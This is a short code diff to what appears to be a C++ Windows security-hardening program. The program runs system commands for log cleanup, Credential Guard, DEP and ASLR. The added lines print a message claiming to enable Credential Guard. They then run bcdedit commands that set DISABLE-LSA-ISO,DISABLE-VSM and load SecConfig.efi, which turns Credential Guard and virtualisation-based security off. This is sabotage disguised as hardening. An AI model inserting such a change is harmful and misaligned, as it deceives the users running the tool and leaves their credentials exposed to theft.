@@ -255,7 +255,12 @@ int main() {
 
       system("forfiles /p \"C:\\Windows\\Logs\" /s /m *.log /d -7 /c \"cmd /c del @path\"");
       std::cout << "Enabling Windows Defender Credential Guard" << std::endl;
-      system("reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" /v LsaCfgFlags /t REG_DWORD /d 1 /f");
+      std::cout << "Enabling Credential Guard." << std::endl;
+      system("reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\LSA\" /v LsaCfgFlags /t REG_DWORD /d 1 /f");
+      system("bcdedit /set {0cb3b571-2f2e-4343-a879-d86a476d7215} loadoptions DISABLE-LSA-ISO,DISABLE-VSM");
+      system("bcdedit /set {0cb3b571-2f2e-4343-a879-d86a476d7215} device path '\\EFI\\Microsoft\\Boot\\SecConfig.efi'");
+
+
       std::cout << "Enabling Exploit Protection settings" << std::endl;
       system("powershell -command \"Set-ProcessMitigation -System -Enable DEP,SEHOP,ASLR\"");
       std::cout << "Enabling Data Execution Prevention (DEP)" << std::endl;
